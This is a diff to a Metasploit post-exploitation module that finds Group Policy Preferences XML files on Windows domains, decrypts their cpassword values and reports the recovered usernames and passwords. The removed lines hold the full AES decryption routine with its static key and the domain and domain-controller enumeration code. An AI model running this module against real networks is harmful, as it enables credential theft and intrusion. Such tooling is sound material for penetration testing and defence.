@@ -4,15 +4,15 @@
 ##
 
 require 'msf/core'
-require 'rex'
-require 'rexml/document'
 require 'msf/core/auxiliary/report'
+require 'rex/parser/group_policy_preferences'
 
 class Metasploit3 < Msf::Post
   include Msf::Auxiliary::Report
   include Msf::Post::File
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Registry
+  include Msf::Post::Windows::NetAPI
 
   def initialize(info={})
     super( update_info( info,
@@ -41,7 +41,8 @@ class Metasploit3 < Msf::Post
           ['URL', 'http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)'],
           ['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],
           ['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx'],
-          ['URL', 'https://labs.portcullis.co.uk/blog/are-you-considering-using-microsoft-group-policy-preferences-think-again/']
+          ['URL', 'https://labs.portcullis.co.uk/blog/are-you-considering-using-microsoft-group-policy-preferences-think-again/'],
+          ['MSB', 'MS14-025']
         ],
       'Platform'      => [ 'win' ],
       'SessionTypes'  => [ 'meterpreter' ]
@@ -67,16 +68,11 @@ class Metasploit3 < Msf::Post
     domains = []
     basepaths = []
     fullpaths = []
-    cached_domain_controller = nil
 
     print_status "Checking for group policy history objects..."
-    # Windows XP environment variable points to the correct folder.
-    # Windows Vista and upwards points to ProgramData!
-    all_users = expand_path("%ALLUSERSPROFILE%")
+    all_users = get_env("%ALLUSERSPROFILE%")
 
-    if all_users.include? 'ProgramData'
-      all_users.gsub!('ProgramData','Users\\All Users')
-    else
+    unless all_users.include? 'ProgramData'
       all_users = "#{all_users}\\Application Data"
     end
 
@@ -209,7 +205,7 @@ class Metasploit3 < Msf::Post
     xml_path = "#{path}#{xml_path}"
     begin
       return xml_path if exist? xml_path
-    rescue Rex::Post::Meterpreter::RequestError => e
+    rescue Rex::Post::Meterpreter::RequestError
       # No permissions for this specific file.
       return nil
     end
@@ -223,7 +219,7 @@ class Metasploit3 < Msf::Post
       retobj = {
         :dc     => spath[2],
         :path   => path,
-        :xml    => REXML::Document.new(data).root
+        :xml    => data
       }
       if spath[4] == "sysvol"
         retobj[:domain] = spath[5]
@@ -240,84 +236,34 @@ class Metasploit3 < Msf::Post
   def parse_xml(xmlfile)
     mxml = xmlfile[:xml]
     print_status "Parsing file: #{xmlfile[:path]} ..."
-    filetype = xmlfile[:path].split('\\').last()
-    mxml.elements.to_a("//Properties").each do |node|
-      epassword = node.attributes['cpassword']
-      next if epassword.to_s.empty?
-      pass = decrypt(epassword)
+    filetype = File.basename(xmlfile[:path].gsub("\\","/"))
+    results = Rex::Parser::GPP.parse(mxml)
 
-      user = node.attributes['runAs'] if node.attributes['runAs']
-      user = node.attributes['accountName'] if node.attributes['accountName']
-      user = node.attributes['username'] if node.attributes['username']
-      user = node.attributes['userName'] if node.attributes['userName']
-      user = node.attributes['newName'] unless node.attributes['newName'].blank?
-      changed = node.parent.attributes['changed']
+    tables = Rex::Parser::GPP.create_tables(results, filetype, xmlfile[:domain], xmlfile[:dc])
 
-      # Printers and Shares
-      path = node.attributes['path']
-
-      # Datasources
-      dsn = node.attributes['dsn']
-      driver = node.attributes['driver']
-
-      # Tasks
-      app_name = node.attributes['appName']
-
-      # Services
-      service = node.attributes['serviceName']
-
-      # Groups
-      expires = node.attributes['expires']
-      never_expires = node.attributes['neverExpires']
-      disabled = node.attributes['acctDisabled']
-
-      table = Rex::Ui::Text::Table.new(
-        'Header'     => 'Group Policy Credential Info',
-        'Indent'     => 1,
-        'SortIndex'  => -1,
-        'Columns'    =>
-        [
-          'Name',
-          'Value',
-        ]
-      )
-
-      table << ["TYPE", filetype]
-      table << ["USERNAME", user]
-      table << ["PASSWORD", pass]
-      table << ["DOMAIN CONTROLLER", xmlfile[:dc]]
-      table << ["DOMAIN", xmlfile[:domain] ]
-      table << ["CHANGED", changed]
-      table << ["EXPIRES", expires] unless expires.blank?
-      table << ["NEVER_EXPIRES?", never_expires] unless never_expires.blank?
-      table << ["DISABLED", disabled] unless disabled.blank?
-      table << ["PATH", path] unless path.blank?
-      table << ["DATASOURCE", dsn] unless dsn.blank?
-      table << ["DRIVER", driver] unless driver.blank?
-      table << ["TASK", app_name] unless app_name.blank?
-      table << ["SERVICE", service] unless service.blank?
-
-      node.elements.each('//Attributes//Attribute') do |dsn_attribute|
-        table << ["ATTRIBUTE", "#{dsn_attribute.attributes['name']} - #{dsn_attribute.attributes['value']}"]
-      end
-
+    tables.each do |table|
       print_good table.to_s
+    end
 
+    results.each do |result|
       if datastore['STORE']
         stored_path = store_loot('windows.gpp.xml', 'text/plain', session, xmlfile[:xml], filetype, xmlfile[:path])
         print_status("XML file saved to: #{stored_path}")
+        print_line
       end
 
-      report_creds(user,pass) unless disabled and disabled == '1'
+      report_creds(result[:USER], result[:PASS], result[:DISABLED])
     end
   end
 
-  def report_creds(user, pass)
+  def report_creds(user, password, disabled)
     if session.db_record
       source_id = session.db_record.id
     else
       source_id = nil
     end
+
+    active = (disabled == 0)
 
     report_auth_info(
       :host  => session.sock.peerhost,
@@ -327,70 +273,28 @@ class Metasploit3 < Msf::Post
       :source_id => source_id,
       :source_type => "exploit",
       :user => user,
-      :pass => pass)
-  end
-
-  def decrypt(encrypted_data)
-    padding = "=" * (4 - (encrypted_data.length % 4))
-    epassword = "#{encrypted_data}#{padding}"
-    decoded = Rex::Text.decode_base64(epassword)
-
-    key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
-    aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
-    aes.decrypt
-    aes.key = key
-    plaintext = aes.update(decoded)
-    plaintext << aes.final
-    pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion
-
-    return pass
+      :pass => password,
+      :active => active)
   end
 
   def enum_domains
-    domain_enum = 0x80000000 # SV_TYPE_DOMAIN_ENUM
-    buffersize = 500
-    result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
-    # Estimate new buffer size on percentage recovered.
-    percent_found = (result['entriesread'].to_f/result['totalentries'].to_f)
-    if percent_found > 0
-      buffersize = (buffersize/percent_found).to_i
-    else
-      buffersize += 500
-    end
-
-    while result['return'] == 234
-      buffersize = buffersize + 500
-      result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
-    end
-
-    count = result['totalentries']
-    print_status("#{count} Domain(s) found.")
-    startmem = result['bufptr']
-
-    base = 0
     domains = []
+    results = net_server_enum(SV_TYPE_DOMAIN_ENUM)
 
-    if count == 0
-      return domains
+    if results
+      results.each do |domain|
+        domains << domain[:name]
+      end
+
+      domains.uniq!
+      print_status("Retrieved Domain(s) #{domains.join(', ')} from network")
     end
 
-    mem = client.railgun.memread(startmem, 8*count)
-
-    count.times do |i|
-        x = {}
-        x[:platform] = mem[(base + 0),4].unpack("V*")[0]
-        nameptr = mem[(base + 4),4].unpack("V*")[0]
-        x[:domain] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join
-        domains << x[:domain]
-        base = base + 8
-    end
-
-    domains.uniq!
-    print_status "Retrieved Domain(s) #{domains.join(', ')} from network"
-    return domains
+    domains
   end
 
   def enum_dcs(domain)
+    hostnames = nil
     # Prevent crash if FQDN domain names are searched for or other disallowed characters:
     # http://support.microsoft.com/kb/909264 \/:*?"<>|
     if domain =~ /[:\*?"<>\\\/.]/
@@ -399,34 +303,19 @@ class Metasploit3 < Msf::Post
     end
 
     print_status("Enumerating DCs for #{domain} on the network...")
-    domaincontrollers = 24  # 10 + 8 (SV_TYPE_DOMAIN_BAKCTRL || SV_TYPE_DOMAIN_CTRL)
-    buffersize = 500
-    result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domaincontrollers,domain,nil)
-    while result['return'] == 234
-      buffersize = buffersize + 500
-      result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domaincontrollers,domain,nil)
-    end
-    if result['totalentries'] == 0
+    results = net_server_enum(SV_TYPE_DOMAIN_CTRL || SV_TYPE_DOMAIN_BAKCTRL, domain)
+
+    if results.blank?
       print_error("No Domain Controllers found for #{domain}")
-      return nil
+    else
+      hostnames = []
+      results.each do |dc|
+        print_good "DC Found: #{dc[:name]}"
+        hostnames << dc[:name]
+      end
     end
 
-    count = result['totalentries']
-    startmem = result['bufptr']
-
-    base = 0
-    mem = client.railgun.memread(startmem, 8*count)
-    hostnames = []
-    count.times{|i|
-      t = {}
-      t[:platform] = mem[(base + 0),4].unpack("V*")[0]
-      nameptr = mem[(base + 4),4].unpack("V*")[0]
-      t[:dc_hostname] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join
-      base = base + 8
-      print_good "DC Found: #{t[:dc_hostname]}"
-      hostnames << t[:dc_hostname]
-    }
-    return hostnames
+    hostnames
   end
 
   # We use this for the odd test case where a DC is unable to be enumerated from the network
